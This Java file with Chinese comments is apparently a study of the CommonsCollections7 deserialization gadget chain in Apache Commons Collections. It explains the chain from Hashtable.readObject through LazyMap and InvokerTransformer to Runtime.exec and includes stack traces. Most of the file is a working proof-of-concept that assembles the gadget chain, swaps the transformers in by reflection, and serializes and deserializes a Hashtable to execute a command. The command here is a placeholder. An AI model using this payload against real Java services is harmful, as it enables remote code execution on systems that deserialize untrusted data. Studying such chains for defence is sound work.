package com.example.apache_collections;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.AbstractMapDecorator;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.*;

public class CommonCollections7 {
    /*
    首先看`PoC`的调用链：
    ```java
    java.util.Hashtable.readObject
    java.util.Hashtable.reconstitutionPut
    org.apache.commons.collections.map.AbstractMapDecorator.equals
    java.util.AbstractMap.equals
    org.apache.commons.collections.map.LazyMap.get
    org.apache.commons.collections.functors.ChainedTransformer.transform
    org.apache.commons.collections.functors.InvokerTransformer.transform
    java.lang.reflect.Method.invoke
    sun.reflect.DelegatingMethodAccessorImpl.invoke
    sun.reflect.NativeMethodAccessorImpl.invoke
    sun.reflect.NativeMethodAccessorImpl.invoke0
    java.lang.Runtime.exec
    ```


     */

    public static void main(String[] args) throws IOException, ClassNotFoundException, IllegalAccessException, NoSuchFieldException {

//        File f = new File("/home/uustay/test_7.ser");
//        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(f));
//        objectInputStream.readObject();


        String commond = "galculator11";
        ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.class);
        InvokerTransformer invokerTransformer = new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null});
        InvokerTransformer invokerTransformer1 = new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null});
//        Runtime.getRuntime().exec();
        InvokerTransformer invokerTransformer2 = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{commond});
        // 加不加这个，都不行。
        ConstantTransformer constantTransformer1 = new ConstantTransformer("1");

        Transformer[] transformers = new Transformer[]{constantTransformer, invokerTransformer, invokerTransformer1, invokerTransformer2};
        ChainedTransformer chainedTransformer = new ChainedTransformer( new Transformer[]{ new ConstantTransformer("1")});
//        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap hashMap = new HashMap();
        Map lazyMap;
        lazyMap = LazyMap.decorate(hashMap, chainedTransformer);

        HashMap hashMap2 = new HashMap();
        Map lazyMap2;
        lazyMap2 = LazyMap.decorate(hashMap2, chainedTransformer);

        lazyMap.put("yy", 1);
        lazyMap2.put("zZ", 1);





        /*
        看一下该类的构造类:  但是该类由`abstract` 修释， 不能直接创建，
        ```java
        // AbstractMapDecorator.java
         public boolean equals(Object object) {
                return object == this ? true : this.map.equals(object);
            }

        // AbstractMap.java
        public boolean equals(Object o) {
            if (o == this)
                return true;

            if (!(o instanceof Map))
                return false;
            Map<K,V> m = (Map<K,V>) o;
            if (m.size() != size())
                return false;

            try {
                Iterator<Entry<K,V>> i = entrySet().iterator();
                while (i.hasNext()) {
                    Entry<K,V> e = i.next();
                    K key = e.getKey();
                    V value = e.getValue();
                    if (value == null) {
                        if (!(m.get(key)==null && m.containsKey(key)))
                            return false;
                    } else {
                        if (!value.equals(m.get(key)))
                            return false;
                    }
                }
            } catch (ClassCastException unused) {
                return false;
            } catch (NullPointerException unused) {
                return false;
            }

            return true;
        }
        ```

        又因为 LazyMap继承了 AbstractMapDecorator,  且未重写`equals`方法
        HashMap 继承了 AbstractMap，  且未重写`equals`方法
        所以  LazyMap.equals 调用了 AbstractMapDecorator.equals,
        HashMap.equals 调用了AbstractMap.equals
        在 AbstractMap.equals中， 参数为Object o,  并强制转换类型为 ` Map<K,V> m = (Map<K,V>) o;`
        调用了 `m.get()`,  如果此时 m 为 `LazyMap`那么即可导致反序列化
         */
        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap, 1);
        hashtable.put(lazyMap2, 2);
        /*
        我们按自己更解的来尝试，发现在put方法时，已经触发了反序列化操作。  看`PoC` 里在做好后，用反射将`iTransformers`设置为`Transform[]`
        ```java
        Exception in thread "main" org.apache.commons.collections.FunctorException: InvokerTransformer: The method 'exec' on 'class java.lang.Runtime' threw an exception
            at org.apache.commons.collections.functors.InvokerTransformer.transform(InvokerTransformer.java:132)
            at org.apache.commons.collections.functors.ChainedTransformer.transform(ChainedTransformer.java:122)
            at org.apache.commons.collections.map.LazyMap.get(LazyMap.java:151)
            at java.util.AbstractMap.equals(AbstractMap.java:460)
            at org.apache.commons.collections.map.AbstractMapDecorator.equals(AbstractMapDecorator.java:129)
            at java.util.Hashtable.put(Hashtable.java:522)
            at com.example.apache_collections.CommonCollections7.main(CommonCollections7.java:121)
         ```

         在添加反射后， 成功触发， 其报错为： 需要考虑的一点是， 必须添加 `lazyMap2.remove("yy");`
         经过`Debug` 在 `hashtable.put(lazyMap2, 2);` 时， 会调用 `HashTable.put`中的
         `if ((e.hash == hash) && e.key.equals(key)) {`
         进入e.key.equals（key) 函数： `AbstractMapDecorator.equals`
         继续进入 `AbstractMap.equals` 进入分支 `if (!value.equals(m.get(key)))`：
         此时判断m是否包含Key， m为LazyMap对象,  调用了： `super.map.put(key, value);`
         所以在hashtable.put(lazyMap2，2)后， lazyMap的 keySet 包含2个变量，`zz`, `yy`
         而如果不将 `yy` 删除， 则在反序列化时 `super.map.containsKey(key)` 为 `True`
         无法进入`transform`分支， 导致失败。

         ```java
         //AbstractMapDecorator.put
            public boolean equals(Object object) {
                return object == this ? true : this.map.equals(object);
            }

         // LazyMap.get
            public Object get(Object key) {
                if (!super.map.containsKey(key)) {
                    Object value = this.factory.transform(key);
                    super.map.put(key, value);
                    return value;
                } else {
                    return super.map.get(key);
                }
            }



         ```
         ```java
         Exception in thread "main" org.apache.commons.collections.FunctorException: InvokerTransformer: The method 'exec' on 'class java.lang.Runtime' threw an exception
            at org.apache.commons.collections.functors.InvokerTransformer.transform(InvokerTransformer.java:132)
            at org.apache.commons.collections.functors.ChainedTransformer.transform(ChainedTransformer.java:122)
            at org.apache.commons.collections.map.LazyMap.get(LazyMap.java:151)
            at java.util.AbstractMap.equals(AbstractMap.java:460)
            at org.apache.commons.collections.map.AbstractMapDecorator.equals(AbstractMapDecorator.java:129)
            at java.util.Hashtable.reconstitutionPut(Hashtable.java:1025)
            at java.util.Hashtable.readObject(Hashtable.java:998)
            at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
            at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
            at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
            at java.lang.reflect.Method.invoke(Method.java:606)
            at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1017)
            at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:1893)
            at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1798)
            at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1350)
            at java.io.ObjectInputStream.readObject(ObjectInputStream.java:370)
            at com.example.apache_collections.CommonCollections7.do_unserialize(CommonCollections7.java:168)
         ```
        至此， `CommonCollection7` 分析完毕
         */

        Field field = chainedTransformer.getClass().getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(chainedTransformer, transformers);

        System.out.println("lazyMap.keySet()" + lazyMap.keySet().toString());
        System.out.println("lazyMap2.keySet()" + lazyMap2.keySet().toString());
        lazyMap2.remove("yy");

        byte[] a = do_serialize(hashtable);
        Object b = do_unserialize(a);

        /*
        再看HashTable

         */



    }

    public static byte[]  do_serialize(Object obj) throws IOException {
        ByteArrayOutputStream btout = new ByteArrayOutputStream();

        ObjectOutputStream oos = new ObjectOutputStream(btout);
        oos.writeObject(obj);
        System.out.println("do serialized success");
        return btout.toByteArray();
    }

    public static Object do_unserialize(byte[] data) throws IOException, ClassNotFoundException {
        ByteArrayInputStream btin = new ByteArrayInputStream(data);
        ObjectInputStream ooi = new ObjectInputStream(btin);

        System.out.println("do unserialized success");
        return ooi.readObject();
    }
}
